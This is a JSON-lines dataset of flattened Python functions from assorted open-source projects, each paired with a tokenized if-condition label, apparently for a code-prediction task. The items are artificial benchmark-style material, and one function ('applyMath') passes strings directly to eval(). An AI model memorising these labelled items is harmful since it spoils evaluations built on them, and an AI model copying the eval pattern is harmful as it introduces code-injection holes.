{"input": "def spool_print(*args, **kwargs): with _print_lock: if framework.Framework._spool: framework.Framework._spool.write(f\"{args[0]}{os.linesep}\") framework.Framework._spool.flush() # disable terminal output for server jobs if framework.Framework._mode == Mode.JOB: return # new print function must still use the old print function via the backup builtins._print(*args, **kwargs)", "label": "if framework . Framework . _mode == Mode . JOB :"}
{"input": "def _parse_lines(self, linesource): \"\"\"Parse lines of text for functions and classes\"\"\" functions = [] classes = [] for line in linesource: if line.startswith(\"def \") and line.count(\"(\"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): functions.append(name) elif line.startswith(\"class \"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): classes.append(name) else: pass functions.sort() classes.sort() return functions, classes", "label": "if line . startswith ( \"def \" ) and line . count ( \"(\" ) :"}
{"input": "def test_connect_using_sslcontext_verified(self): with support.transient_internet(self.testServer): can_verify = check_ssl_verifiy(self.testServer, self.remotePort) if not can_verify: self.skipTest(\"SSL certificate can't be verified\") support.get_attribute(smtplib, \"SMTP_SSL\") context = ssl.create_default_context() with support.transient_internet(self.testServer): server = smtplib.SMTP_SSL(self.testServer, self.remotePort, context=context) server.ehlo() server.quit()", "label": "if not can_verify :"}
{"input": "def generate_segment_memory(chart_type, race_configs, environment): structures = [] for race_config in race_configs: if \"segment_memory\" in race_config.charts: title = chart_type.format_title( environment, race_config.track, es_license=race_config.es_license, suffix=\"%s-segment-memory\" % race_config.label, ) chart = chart_type.segment_memory(title, environment, race_config) if chart: structures.append(chart) return structures", "label": "if \"segment_memory\" in race_config . charts :"}
{"input": "def __iter__(self): line = b\"\" while True: data = self.read(-1) if not data: break generator = StringIO(data) assert b\"\\n\" not in line, line line += next(generator) if line.endswith(b\"\\n\"): yield line line = b\"\" ll = list(generator) if not ll: continue for line in ll[:-1]: yield line line = ll[-1] if line.endswith(b\"\\n\"): yield line line = b\"\" if line: yield line", "label": "if not data :"}
{"input": "def L_op(self, inputs, outputs, gout): (x,) = inputs (gz,) = gout if outputs[0].type in discrete_types: if x.type in discrete_types: return [x.zeros_like(dtype=theano.config.floatX)] else: return [x.zeros_like()] if x.type in float_types: return (gz * sgn(x),) return (gz * x / abs(x),) # formula works for complex and real", "label": "if x . type in discrete_types :"}
{"input": "def is_ncname(name): first = name[0] if first == \"_\" or category(first) in NAME_START_CATEGORIES: for i in xrange(1, len(name)): c = name[i] if not category(c) in NAME_CATEGORIES: if c in ALLOWED_NAME_CHARS: continue return 0 # if in compatibility area # if decomposition(c)!='': # return 0 return 1 else: return 0", "label": "if not category ( c ) in NAME_CATEGORIES :"}
{"input": "def _read_rows_from(self, avro_reader, header): count = 0 maximum = self.limit if self.limit is not None else sys.maxsize for i, record in enumerate(avro_reader): if i < self.skip: continue if count >= maximum: break count += 1 row = self._map_row_from(header, record) yield row", "label": "if count >= maximum :"}
{"input": "def decorated(cls, *args, **kwargs): storage_res = STORAGE_RES_MAPPING[cls.__class__.__name__][func.__name__] with utils.patch_vnxsystem as patched_vnx: if DEFAULT_STORAGE_RES in storage_res: patched_vnx.return_value = storage_res[DEFAULT_STORAGE_RES] adapter = PROTOCOL_MAPPING[protocol](cls.configuration) return func(cls, adapter, storage_res, *args, **kwargs)", "label": "if DEFAULT_STORAGE_RES in storage_res :"}
{"input": "def _replace_file(src, dst): try: if not _MoveFileEx(src, dst, 1): # MOVEFILE_REPLACE_EXISTING raise OSError('Could not replace \"%s\" -> \"%s\"' % (src, dst)) except: # Sometimes it fails - we play stupid and try again... time.sleep(0.5) if not _MoveFileEx(src, dst, 1): # MOVEFILE_REPLACE_EXISTING raise OSError('Could not replace \"%s\" -> \"%s\"' % (src, dst))", "label": "if not _MoveFileEx ( src , dst , 1 ) :"}
{"input": "def read_track_raw(self, redundancy=1): self._log(\"read track raw\") data = [] await self.lower.write([CMD_READ_RAW, redundancy]) while True: packet = await self.lower.read() if packet[-1] == 0xFF: raise GlasgowAppletError(\"FIFO overflow while reading track\") elif packet[-1] == 0xFE: data.append(packet[:-1]) return b\"\".join(data) else: data.append(packet)", "label": "if packet [ - 1 ] == 0xFF :"}
{"input": "def get_template_sources(self, template_name, template_dirs=None): template_name = self.prepare_template_name(template_name) for loader in self.template_source_loaders: if hasattr(loader, \"get_template_sources\"): try: for result in loader.get_template_sources(template_name, template_dirs): yield result except UnicodeDecodeError: # The template dir name was a bytestring that wasn't valid UTF-8. raise except ValueError: # The joined path was located outside of this particular # template_dir (it might be inside another one, so this isn't # fatal). pass", "label": "if hasattr ( loader , \"get_template_sources\" ) :"}
{"input": "def __init__(self, reg, shtype, shimm, va): if shimm == 0: if shtype == S_ROR: shtype = S_RRX elif shtype == S_LSR or shtype == S_ASR: shimm = 32 self.reg = reg self.shtype = shtype self.shimm = shimm self.va = va", "label": "elif shtype == S_LSR or shtype == S_ASR :"}
{"input": "def pop_many(self, limit=None): if limit is None: limit = DEFAULT_SYNC_OFFLINE_ACTIVITY heartbeats = [] count = 0 while count < limit: heartbeat = self.pop() if not heartbeat: break heartbeats.append(heartbeat) count += 1 if count % HEARTBEATS_PER_REQUEST == 0: yield heartbeats heartbeats = [] if heartbeats: yield heartbeats", "label": "if count % HEARTBEATS_PER_REQUEST == 0 :"}
{"input": "def _set_live(self, live, _): if live is not None and not self.live: if isinstance(live, basestring): live = [live] # Default is to use Memory analysis. if len(live) == 0: mode = \"Memory\" elif len(live) == 1: mode = live[0] else: raise RuntimeError(\"--live parameter should specify only one mode.\") live_plugin = self.session.plugins.live(mode=mode) live_plugin.live() # When the session is destroyed, close the live plugin. self.session.register_flush_hook(self, live_plugin.close) return live", "label": "if isinstance ( live , basestring ) :"}
{"input": "def capture_output(redirect_stderr=True): oldout, olderr = sys.stdout, sys.stderr try: out = StringIO() sys.stdout = out if redirect_stderr: sys.stderr = out else: sys.stderr = StringIO() yield out except: if redirect_stderr: traceback.print_exc() else: raise finally: sys.stdout, sys.stderr = oldout, olderr", "label": "if redirect_stderr :"}
{"input": "def run(self): self.mpd.connect() events = [\"player\"] while True: if \"player\" in events: status = self.mpd.status() handler = getattr(self, \"on_\" + status[\"state\"], None) if handler: handler(status) else: self._log.debug(u'unhandled status \"{0}\"', status) events = self.mpd.events()", "label": "if handler :"}
{"input": "def get_full_qualified_name(self, node: Element) -> str: if node.get(\"reftype\") == \"option\": progname = node.get(\"std:program\") command = ws_re.split(node.get(\"reftarget\")) if progname: command.insert(0, progname) option = command.pop() if command: return \".\".join([\"-\".join(command), option]) else: return None else: return None", "label": "if progname :"}
{"input": "def _get_sources(self): servers = self.config[\"servers\"] \"\"\"maps urls to extractors\"\"\" server_links = { \"mp4upload\": \"mp4upload.com\", \"gcloud\": \"gcloud.live\", \"gcloud\": \"fembed.com\", } soup = helpers.soupify(helpers.get(self.url)).select(\"iframe\") for a in servers: for b in soup: for c in server_links: if server_links[c] in b.get(\"src\") and a == c: return [(c, b.get(\"src\"))] logger.warn(\"Unsupported URL\") return \"\"", "label": "if server_links [ c ] in b . get ( \"src\" ) and a == c :"}
{"input": "def _self_set(self, context): if self.keys is not None: return new_dict = context.get_pynames([\"self\", \"d\"])[1] if new_dict and isinstance(new_dict.get_object().get_type(), Dict): args = arguments.ObjectArguments([new_dict]) items = new_dict.get_object()[\"popitem\"].get_object().get_returned_object(args) context.save_per_name(items) else: holding = _infer_sequence_for_pyname(new_dict) if holding is not None and isinstance(holding.get_type(), Tuple): context.save_per_name(holding)", "label": "if holding is not None and isinstance ( holding . get_type ( ) , Tuple ) :"}
{"input": "def create(): \"\"\"Create a new post for the current user.\"\"\" if request.method == \"POST\": title = request.form[\"title\"] body = request.form[\"body\"] error = None if not title: error = \"Title is required.\" if error is not None: flash(error) else: db.session.add(Post(title=title, body=body, author=g.user)) db.session.commit() return redirect(url_for(\"blog.index\")) return render_template(\"blog/create.html\")", "label": "if not title :"}
{"input": "def _find_host_dir_ldconfig(self, arch=\"x86-64\"): \"\"\"Find host nvidia libraries via ldconfig\"\"\" dir_list = set() ld_data = Uprocess().get_output([\"ldconfig\", \"-p\"]) if ld_data: regexp = \"[ |\\t]%s[^ ]* .*%s.*=> (/.*)\" for line in ld_data.split(\"\\n\"): for lib in self._nvidia_main_libs: match = re.search(regexp % (lib, arch), line) if match: dir_list.add( os.path.realpath(os.path.dirname(match.group(1))) + \"/\" ) return dir_list", "label": "if match :"}
{"input": "def migrate_replay_storage(apps, schema_editor): model = apps.get_model(\"terminal\", \"ReplayStorage\") init_storage_data(model) setting = get_setting(apps, schema_editor, \"TERMINAL_REPLAY_STORAGE\") if not setting: return values = get_storage_data(setting) for name, meta in values.items(): tp = meta.pop(\"TYPE\", None) if not tp or name in [\"default\", \"null\"]: continue model.objects.create(name=name, type=tp, meta=meta)", "label": "if not tp or name in [ \"default\" , \"null\" ] :"}
{"input": "def load_distribution(args: CommandLineArguments) -> CommandLineArguments: if args.distribution is not None: args.distribution = Distribution[args.distribution] if args.distribution is None or args.release is None: d, r = detect_distribution() if args.distribution is None: args.distribution = d if args.distribution == d and d != Distribution.clear and args.release is None: args.release = r if args.distribution is None: die(\"Couldn't detect distribution.\") return args", "label": "if args . distribution == d and d != Distribution . clear and args . release is None :"}
{"input": "def fieldset_string_to_field(fieldset_dict, model): if isinstance(fieldset_dict[\"fields\"], tuple): fieldset_dict[\"fields\"] = list(fieldset_dict[\"fields\"]) i = 0 for dict_field in fieldset_dict[\"fields\"]: if isinstance(dict_field, string_types): fieldset_dict[\"fields\"][i] = model._meta.get_field_by_name(dict_field)[0] elif isinstance(dict_field, list) or isinstance(dict_field, tuple): dict_field[1][\"recursive\"] = True fieldset_string_to_field(dict_field[1], model) i += 1", "label": "elif isinstance ( dict_field , list ) or isinstance ( dict_field , tuple ) :"}
{"input": "def icon(display_icon): \"\"\"returns empty dict if show_icons is False, else the icon passed\"\"\" kws = {} if get_icon_switch(): if display_icon.startswith(\"SV_\"): kws = {\"icon_value\": custom_icon(display_icon)} elif display_icon != \"OUTLINER_OB_EMPTY\": kws = {\"icon\": display_icon} return kws", "label": "elif display_icon != \"OUTLINER_OB_EMPTY\" :"}
{"input": "def cancel_helper(self, node, to_cancel): children = set(self.workflow.successors(node)) for child in children: if self.parent_map[child.id_] == 1: to_cancel.append(child.id_) self.cancelled.append(node.id_) await self.cancel_helper(child, to_cancel) return to_cancel", "label": "if self . parent_map [ child . id_ ] == 1 :"}
{"input": "def getStatusString(self): if not self._isAvailable: return \"Doodle3D box not found\" if self._printing: if self._blockIndex < len(self._fileBlocks): ret = \"Sending GCode: %.1f%%\" % ( float(self._blockIndex) * 100.0 / float(len(self._fileBlocks)) ) elif len(self._fileBlocks) > 0: ret = \"Finished sending GCode to Doodle3D box.\" else: ret = \"Different print still running...\" # ret += \"\\nErrorCount: %d\" % (self._errorCount) return ret return \"Printer found, waiting for print command.\"", "label": "elif len ( self . _fileBlocks ) > 0 :"}
{"input": "def test_archive_files_message(self): filelist = [\"test.torrent\", \"deluge.png\"] arc_filepath = archive_files( \"test-arc\", [get_test_data_file(f) for f in filelist], message=\"test\" ) result_files = filelist + [\"archive_message.txt\"] with tarfile.open(arc_filepath, \"r\") as tar: self.assertEqual(tar.getnames(), result_files) for tar_info in tar: self.assertTrue(tar_info.isfile()) if tar_info.name == \"archive_message.txt\": result = tar.extractfile(tar_info).read().decode() self.assertEqual(result, \"test\")", "label": "if tar_info . name == \"archive_message.txt\" :"}
{"input": "def _format_arg(self, opt, spec, val): if opt in [\"in_files\"]: return scans_for_fnames(ensure_list(val)) if opt == \"fwhm\": if not isinstance(val, list): return [val, val, val] if isinstance(val, list): if len(val) == 1: return [val[0], val[0], val[0]] else: return val return super(Smooth, self)._format_arg(opt, spec, val)", "label": "if isinstance ( val , list ) :"}
{"input": "def fuzzy_sum(self, currency, rounding=ROUND_UP): a = Money.ZEROS[currency].amount fuzzy = False for m in self: if m.currency == currency: a += m.amount elif m.amount: a += m.convert(currency, rounding=None).amount fuzzy = True r = Money(a, currency, rounding=rounding) r.fuzzy = fuzzy return r", "label": "if m . currency == currency :"}
{"input": "def _read_potfiles(src_root, potfiles): \"\"\"Returns a list of paths for a POTFILES.in file\"\"\" paths = [] with open(potfiles, \"r\", encoding=\"utf-8\") as h: for line in h: line = line.strip() if not line or line.startswith(\"#\"): continue paths.append(os.path.normpath(os.path.join(src_root, line))) return paths", "label": "if not line or line . startswith ( \"#\" ) :"}
{"input": "def applyMath(self, val, math, frmt): # apply math function - eval try: x = eval(val) if math != \"\": x = eval(math) val = (\"{0\" + frmt + \"}\").format(x) except: dprint( __name__, 0, \"CCmds_applyMath: Error in math {0}, frmt {1}\\n{2}\", math, frmt, traceback.format_exc(), ) # apply format specifier dprint(__name__, 2, \"CCmds_applyMath: {0}\", val) return val", "label": "if math != \"\" :"}
{"input": "def run_train_loop(self): self.begin_training() for _ in self.yield_train_step(): if self.should_save_model(): self.save_model() if self.should_save_checkpoint(): self.save_checkpoint() if self.should_eval_model(): self.eval_model() if self.should_break_training(): break self.eval_model() self.done_training() return self.returned_result()", "label": "if self . should_save_model ( ) :"}
{"input": "def node_exists(self, jid=None, node=None, ifrom=None): with self.lock: if jid is None: jid = self.xmpp.boundjid.full if node is None: node = \"\" if ifrom is None: ifrom = \"\" if isinstance(ifrom, JID): ifrom = ifrom.full if (jid, node, ifrom) not in self.nodes: return False return True", "label": "if node is None :"}
{"input": "def _collect(self, writer=None): for artifact_name in self.plugin_args.artifacts: for hit in self.collect_artifact(artifact_name): if \"result\" in hit and writer: writer.write_result(hit[\"result\"]) yield hit", "label": "if \"result\" in hit and writer :"}
{"input": "def proc(qtbot, caplog): \"\"\"A fixture providing a GUIProcess and cleaning it up after the test.\"\"\" p = guiprocess.GUIProcess(\"testprocess\") yield p if p._proc.state() == QProcess.Running: with caplog.at_level(logging.ERROR): with qtbot.waitSignal(p.finished, timeout=10000, raising=False) as blocker: p._proc.terminate() if not blocker.signal_triggered: p._proc.kill() p._proc.waitForFinished()", "label": "if not blocker . signal_triggered :"}
{"input": "def getsequences(self): \"\"\"Return the set of sequences for the folder.\"\"\" sequences = {} fullname = self.getsequencesfilename() try: f = open(fullname, \"r\") except IOError: return sequences while 1: line = f.readline() if not line: break fields = line.split(\":\") if len(fields) != 2: self.error(\"bad sequence in %s: %s\" % (fullname, line.strip())) key = fields[0].strip() value = IntSet(fields[1].strip(), \" \").tolist() sequences[key] = value return sequences", "label": "if not line :"}
{"input": "def get_coeffs(e): coeffs = [] for du in all_delu_dict.keys(): if type(self.as_coeffs_dict[e]).__name__ == \"float\": coeffs.append(self.as_coeffs_dict[e]) elif du in self.as_coeffs_dict[e].keys(): coeffs.append(self.as_coeffs_dict[e][du]) else: coeffs.append(0) return np.array(coeffs)", "label": "if type ( self . as_coeffs_dict [ e ] ) . __name__ == \"float\" :"}
{"input": "def block_items(objekt, block, eldict): if objekt not in block: if isinstance(objekt.type, PyType): if objekt.type not in block: block.append(objekt.type) block.append(objekt) if isinstance(objekt, PyType): others = [ p for p in eldict.values() if isinstance(p, PyElement) and p.type[1] == objekt.name ] for item in others: if item not in block: block.append(item) return block", "label": "if item not in block :"}
{"input": "def FindPrefix(self, prefix): self.log.WriteText(\"Looking for prefix: %s\\n\" % prefix) if prefix: prefix = prefix.lower() length = len(prefix) # Changed in 2.5 because ListBox.Number() is no longer supported. # ListBox.GetCount() is now the appropriate way to go. for x in range(self.GetCount()): text = self.GetString(x) text = text.lower() if text[:length] == prefix: self.log.WriteText(\"Prefix %s is found.\\n\" % prefix) return x self.log.WriteText(\"Prefix %s is not found.\\n\" % prefix) return -1", "label": "if text [ : length ] == prefix :"}
{"input": "def encode(self, input, errors=\"strict\"): if self.encoder is None: result = codecs.utf_32_encode(input, errors) if sys.byteorder == \"little\": self.encoder = codecs.utf_32_le_encode else: self.encoder = codecs.utf_32_be_encode return result else: return self.encoder(input, errors)", "label": "if sys . byteorder == \"little\" :"}
{"input": "def __call__(self, message, keyname): if keyname in self.keyring: key = self.keyring[keyname] if isinstance(key, Key) and key.algorithm == GSS_TSIG: if message: GSSTSigAdapter.parse_tkey_and_step(key, message, keyname) return key else: return None", "label": "if isinstance ( key , Key ) and key . algorithm == GSS_TSIG :"}
{"input": "def unicode_metrics(metrics): for i, metric in enumerate(metrics): for key, value in metric.items(): if isinstance(value, basestring): metric[key] = unicode(value, errors=\"replace\") elif isinstance(value, tuple) or isinstance(value, list): value_list = list(value) for j, value_element in enumerate(value_list): if isinstance(value_element, basestring): value_list[j] = unicode(value_element, errors=\"replace\") metric[key] = tuple(value_list) metrics[i] = metric return metrics", "label": "if isinstance ( value_element , basestring ) :"}
{"input": "def step(self, action): assert self.action_space.contains(action) if self._state == 4: if action and self._case: return self._state, 10.0, True, {} else: return self._state, -10, True, {} else: if action: if self._state == 0: self._state = 2 else: self._state += 1 elif self._state == 2: self._state = self._case return self._state, -1, False, {}", "label": "if self . _state == 0 :"}
{"input": "def get_superuser(self): try: query = dict() if get_user_model().USERNAME_FIELD != \"email\": query[get_user_model().USERNAME_FIELD] = \"admin\" else: query[get_user_model().USERNAME_FIELD] = \"admin@django-cms.org\" admin = get_user_model().objects.get(**query) except get_user_model().DoesNotExist: admin = self._create_user(\"admin\", is_staff=True, is_superuser=True) return admin", "label": "if get_user_model ( ) . USERNAME_FIELD != \"email\" :"}
{"input": "def newend(self): newenddatetime = self._newenddate if not self.checkallday.state: if not hasattr(self.enddt, \"tzinfo\") or self.enddt.tzinfo is None: tzinfo = self.conf.default.default_timezone else: tzinfo = self.enddt.tzinfo try: newendtime = self._newendtime newenddatetime = datetime.combine(newenddatetime, newendtime) newenddatetime = tzinfo.localize(newenddatetime) except TypeError: return None return newenddatetime", "label": "if not hasattr ( self . enddt , \"tzinfo\" ) or self . enddt . tzinfo is None :"}
{"input": "def run(self): to_delete = set() for k, v in iteritems(self.objs): if k.startswith(\"_\"): continue if v[\"_class\"] == \"SubmissionFormatElement\": to_delete.add(k) if v[\"_class\"] == \"Task\": v[\"submission_format\"] = list( self.objs[k][\"filename\"] for k in v.get(\"submission_format\", list()) ) for k in to_delete: del self.objs[k] return self.objs", "label": "if v [ \"_class\" ] == \"SubmissionFormatElement\" :"}
{"input": "def update_reserved_qty_for_subcontract(self): for d in self.supplied_items: if d.rm_item_code: stock_bin = get_bin(d.rm_item_code, d.reserve_warehouse) stock_bin.update_reserved_qty_for_sub_contracting()", "label": "if d . rm_item_code :"}
{"input": "def process(self): if \"Length\" in self.outputs and self.outputs[\"Length\"].is_linked: if \"Data\" in self.inputs and self.inputs[\"Data\"].is_linked: data = self.inputs[\"Data\"].sv_get(deepcopy=False) if not self.level: out = [[len(data)]] elif self.level == 1: out = [self.count(data, self.level)] else: out = self.count(data, self.level) self.outputs[\"Length\"].sv_set(out)", "label": "if not self . level :"}
{"input": "def _user_has_perm(user, perm, obj): anon = user.is_anonymous() for backend in auth.get_backends(): if not anon or backend.supports_anonymous_user: if hasattr(backend, \"has_perm\"): if obj is not None: if backend.supports_object_permissions and backend.has_perm( user, perm, obj ): return True else: if backend.has_perm(user, perm): return True return False", "label": "if not anon or backend . supports_anonymous_user :"}
{"input": "def visit(self, node=None): \"\"\"Walks over a node. If no node is provided, the tree is used.\"\"\" if node is None: node = self.tree if node is None: raise RuntimeError(\"no node or tree given!\") for clsname in map(_lowername, type.mro(node.__class__)): meth = getattr(self, \"visit_\" + clsname, None) if callable(meth): rtn = meth(node) break else: msg = \"could not find valid visitor method for {0} on {1}\" nodename = node.__class__.__name__ selfname = self.__class__.__name__ raise AttributeError(msg.format(nodename, selfname)) return rtn", "label": "if callable ( meth ) :"}
{"input": "def add_fade_out(compositor, fade_out_length): clip = _get_compositor_clip(compositor) keyframe_property, property_klass, keyframes = _get_kfproperty_klass_and_keyframes( compositor, clip ) if fade_out_length > 0: if fade_out_length + 1 <= clip.clip_length(): return _do_user_add_fade_out( keyframe_property, property_klass, keyframes, fade_out_length, clip ) else: _show_length_error_dialog() return None", "label": "if fade_out_length + 1 <= clip . clip_length ( ) :"}
{"input": "def make_timesheet_records(): employees = get_timesheet_based_salary_slip_employee() for e in employees: ts = make_timesheet( e.employee, simulate=True, billable=1, activity_type=get_random(\"Activity Type\"), company=frappe.flags.company, ) frappe.db.commit() rand = random.random() if rand >= 0.3: make_salary_slip_for_timesheet(ts.name) rand = random.random() if rand >= 0.2: make_sales_invoice_for_timesheet(ts.name)", "label": "if rand >= 0.2 :"}
{"input": "def _target_from_batch(self, batch): targets = [] for name in self.labels: target = getattr(batch, name) if name in [Target.TARGET_PROB_FIELD, Target.TARGET_LOGITS_FIELD]: label_vocab = self.metadata.target.vocab.stoi batch_label_list = getattr(batch, Target.TARGET_LABEL_FIELD) target = align_target_labels(target, batch_label_list, label_vocab) targets.append(target) if len(targets) == 1: return targets[0] return tuple(targets)", "label": "if name in [ Target . TARGET_PROB_FIELD , Target . TARGET_LOGITS_FIELD ] :"}
{"input": "def detectForms(html): erreur = \"\" soup = BeautifulSoup(html, \"html.parser\") detectedForms = soup.find_all(\"form\") returnForms = [] if len(detectedForms) > 0: for f in detectedForms: fileInputs = f.findChildren(\"input\", {\"type\": re.compile(\"file\", re.I)}) if len(fileInputs) > 0: returnForms.append((f, fileInputs)) return returnForms", "label": "if len ( fileInputs ) > 0 :"}
{"input": "def _updateNewCardRatio(self): if self.col.conf[\"newSpread\"] == NEW_CARDS_DISTRIBUTE: if self.newCount: self.newCardModulus = (self.newCount + self.revCount) // self.newCount # if there are cards to review, ensure modulo >= 2 if self.revCount: self.newCardModulus = max(2, self.newCardModulus) return self.newCardModulus = 0", "label": "if self . newCount :"}
{"input": "def __prep_write_total(self, comments, main, fallback, single): lower = self.as_lowercased() for k in [main, fallback, single]: if k in comments: del comments[k] if single in lower: parts = lower[single].split(\"/\", 1) if parts[0]: comments[single] = [parts[0]] if len(parts) > 1: comments[main] = [parts[1]] if main in lower: comments[main] = lower.list(main) if fallback in lower: if main in comments: comments[fallback] = lower.list(fallback) else: comments[main] = lower.list(fallback)", "label": "if k in comments :"}
{"input": "def check_physical(self, line): \"\"\"Run all physical checks on a raw input line.\"\"\" self.physical_line = line for name, check, argument_names in self._physical_checks: self.init_checker_state(name, argument_names) result = self.run_check(check, argument_names) if result is not None: (offset, text) = result self.report_error(self.line_number, offset, text, check) if text[:4] == \"E101\": self.indent_char = line[0]", "label": "if text [ : 4 ] == \"E101\" :"}
{"input": "def dependencies(self): deps = [] midx = None if self.ref is not None: query = GroupQuery(self.ref) g = query.execute(self.schema) if g is None: log.debug(self.schema) raise TypeNotFound(self.ref) deps.append(g) midx = 0 return (midx, deps)", "label": "if g is None :"}
{"input": "def __init__(self, metadata=None): if not metadata: db = get_session() metadata = lookup_feed(db, self.__feed_name__) if not metadata: raise Exception( \"Must have feed metadata in db already, should sync metadata before invoking instance operations\" ) super(AnchoreServiceFeed, self).__init__(metadata=metadata)", "label": "if not metadata :"}
{"input": "def testGetPartRect(self): \"Make sure the part rectangles are retrieved correctly\" for i in range(0, self.ctrl.part_count()): part_rect = self.ctrl.get_part_rect(i) self.assertEqual(part_rect.left, self.part_rects[i].left) if i != self.ctrl.part_count() - 1: self.assertEqual(part_rect.right, self.part_rects[i].right) self.assertEqual(part_rect.top, self.part_rects[i].top) self.assertFalse(abs(part_rect.bottom - self.part_rects[i].bottom) > 2) self.assertRaises(IndexError, self.ctrl.get_part_rect, 99)", "label": "if i != self . ctrl . part_count ( ) - 1 :"}
{"input": "def __call__(self, ctx): if ctx.range and ctx.value: if self.raw: ctx.range.raw_value = ctx.value return scalar = ctx.meta.get(\"scalar\", False) if not scalar: ctx.range = ctx.range.resize(len(ctx.value), len(ctx.value[0])) self._write_value(ctx.range, ctx.value, scalar)", "label": "if not scalar :"}
{"input": "def basic_get(self, queue, no_ack=False, **kwargs): \"\"\"Get message by direct access (synchronous).\"\"\" try: message = self.Message(self._get(queue), channel=self) if not no_ack: self.qos.append(message, message.delivery_tag) return message except Empty: pass", "label": "if not no_ack :"}
{"input": "def http_client(cls) -> aiohttp.ClientSession: if cls._client is None: if not asyncio.get_event_loop().is_running(): raise EnvironmentError( \"Event loop must be running to start HTTP client session.\" ) cls._client = aiohttp.ClientSession(request_class=SSLClientRequest) return cls._client", "label": "if not asyncio . get_event_loop ( ) . is_running ( ) :"}
{"input": "def createMimeType(self): audio = False for prop in self.array(\"header/content/stream_prop\"): guid = prop[\"content/type\"].value if guid == VideoHeader.guid: return u\"video/x-ms-wmv\" if guid == AudioHeader.guid: audio = True if audio: return u\"audio/x-ms-wma\" else: return u\"video/x-ms-asf\"", "label": "if guid == AudioHeader . guid :"}
{"input": "def _removeCachedRFInfo(self, cache_key, path, removeChildPaths): log.debug(\"_removeCachedRFInfo: cache_key %r, path %r\", cache_key, path) if self._cachedFiles.has_key(cache_key): cache = self._cachedFiles[cache_key] if cache.has_key(path): del cache[path] if removeChildPaths: # Remove all cached paths that are under this directory from remotefilelib import addslash dirPath = addslash(path) for keypath in cache.keys(): if keypath.startswith(dirPath): del cache[keypath]", "label": "if keypath . startswith ( dirPath ) :"}
{"input": "def format(self, obj, context, maxlevels, level): if isinstance(obj, unicode): # return (obj.encode('utf8'), True, False) return (obj, True, False) if isinstance(obj, bytes): convert = False # for c in obj: # if ord(c) >= 128: # convert = True # break try: codecs.decode(obj) except: convert = True if convert: return (\"0x{}\".format(obj), True, False) return pprint.PrettyPrinter.format(self, obj, context, maxlevels, level)", "label": "if convert :"}
{"input": "def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None): try: if module is None: module = self.name if section is None: section = \"all_sections\" if s_name is None: s_name = f[\"s_name\"] if source is None: source = os.path.abspath(os.path.join(f[\"root\"], f[\"fn\"])) report.data_sources[module][section][s_name] = source except AttributeError: logger.warning( \"Tried to add data source for {}, but was missing fields data\".format( self.name ) )", "label": "if source is None :"}
{"input": "def open(self, *args, **kwargs): if kwargs.get(\"json\") is not None: with self.session_transaction() as sess: api_key_headers = Headers({\"CSRF-Token\": sess.get(\"nonce\")}) headers = kwargs.pop(\"headers\", Headers()) if isinstance(headers, dict): headers = Headers(headers) headers.extend(api_key_headers) kwargs[\"headers\"] = headers return super(CTFdTestClient, self).open(*args, **kwargs)", "label": "if isinstance ( headers , dict ) :"}
{"input": "def get_params(self): if not hasattr(self, \"input_space\"): raise AttributeError(\"Input space has not been provided.\") rval = [] for layer in self.layers: for param in layer.get_params(): if param.name is None: logger.info(type(layer)) layer_params = layer.get_params() assert not isinstance(layer_params, set) for param in layer_params: if param not in rval: rval.append(param) rval = [elem for elem in rval if elem not in self.freeze_set] assert all([elem.name is not None for elem in rval]) return rval", "label": "if param . name is None :"}
{"input": "def _animate_strategy(self, speed=1): if self._animating == 0: return if self._apply_strategy() is not None: if self._animate.get() == 0 or self._step.get() == 1: return if self._animate.get() == 1: self._root.after(3000, self._animate_strategy) elif self._animate.get() == 2: self._root.after(1000, self._animate_strategy) else: self._root.after(20, self._animate_strategy)", "label": "if self . _animate . get ( ) == 0 or self . _step . get ( ) == 1 :"}
{"input": "def charAt(pos): this.cok() pos = pos.to_int() s = this.to_string() if 0 <= pos < len(s.value): char = s.value[pos] if char not in s.CHAR_BANK: s.Js(char) # add char to char bank return s.CHAR_BANK[char] return s.CHAR_BANK[\"\"]", "label": "if char not in s . CHAR_BANK :"}
{"input": "def find_executable(names): # Given a list of executable names, find the first one that is available # as an executable file, on the path. for name in names: fpath, fname = os.path.split(name) if fpath: # The given name is absolute. if is_executable(name): return name else: # Try to find the name on the PATH for path in os.environ[\"PATH\"].split(os.pathsep): exe_file = os.path.join(path, name) if is_executable(exe_file): return exe_file # Could not find it :( return None", "label": "if is_executable ( exe_file ) :"}
{"input": "def match_file(self, file, tff_format): match = tff_format.search(file.filename.replace(\"\\\\\", \"/\")) if match: result = {} for name, value in match.groupdict().items(): value = value.strip() if name in self.numeric_tags: value = value.lstrip(\"0\") if self.ui.replace_underscores.isChecked(): value = value.replace(\"_\", \" \") result[name] = value return result else: return {}", "label": "if name in self . numeric_tags :"}
{"input": "def __init__( self, filename: str = \"checkpoint\", frequency: Union[int, List[int]] = 1, on: Union[str, List[str]] = \"epoch_end\", ): if isinstance(frequency, list): if not isinstance(on, list) or len(frequency) != len(on): raise ValueError( \"If you pass a list for checkpoint frequencies, the `on` \" \"parameter has to be a list with the same length.\" ) self._frequency = frequency super(_TuneCheckpointCallback, self).__init__(on) self._filename = filename self._counter = Counter() self._cp_count = 0 # Has to be monotonically increasing", "label": "if not isinstance ( on , list ) or len ( frequency ) != len ( on ) :"}
{"input": "def download(cls, architecture, path=\"./\"): if cls.sanity_check(architecture): architecture_file = path + \"imagenet_{}.pth\".format(architecture) if not os.path.exists(architecture_file): kwargs = {} if architecture == \"inception_v3\": kwargs[\"transform_input\"] = False model = models.__dict__[architecture](pretrained=True, **kwargs) torch.save(model, architecture_file) print( \"PyTorch pretrained model is saved as [{}].\".format(architecture_file) ) else: print(\"File [{}] existed!\".format(architecture_file)) return architecture_file else: return None", "label": "if architecture == \"inception_v3\" :"}
{"input": "def __exit__(self, exc_type, exc_value, traceback): self.signal.disconnect(self._listener) if not self.signal_sent: self.test_case.fail(\"Signal was not sent.\") return if self.required_kwargs is not None: missing_kwargs = [] for k in self.required_kwargs: if k not in self.received_kwargs: missing_kwargs.append(k) if missing_kwargs: self.test_case.fail( \"Signal missing required arguments: \" \"%s\" % \",\".join(missing_kwargs) )", "label": "if k not in self . received_kwargs :"}
